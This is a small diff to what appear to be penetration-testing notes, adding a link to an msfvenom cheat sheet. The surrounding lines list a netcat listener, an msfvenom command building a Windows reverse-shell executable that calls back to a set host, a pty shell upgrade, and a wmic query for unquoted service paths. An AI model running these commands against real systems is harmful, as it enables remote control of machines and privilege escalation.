@@ -30,6 +30,8 @@ nc -nlvp 1234 (listen on 1234)
 
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.73 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe
 
+msfvenom cheat sheet https://book.hacktricks.xyz/shells/shells/untitled
+
 python -c 'import pty; pty.spawn("/bin/sh")'
 ***
 wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
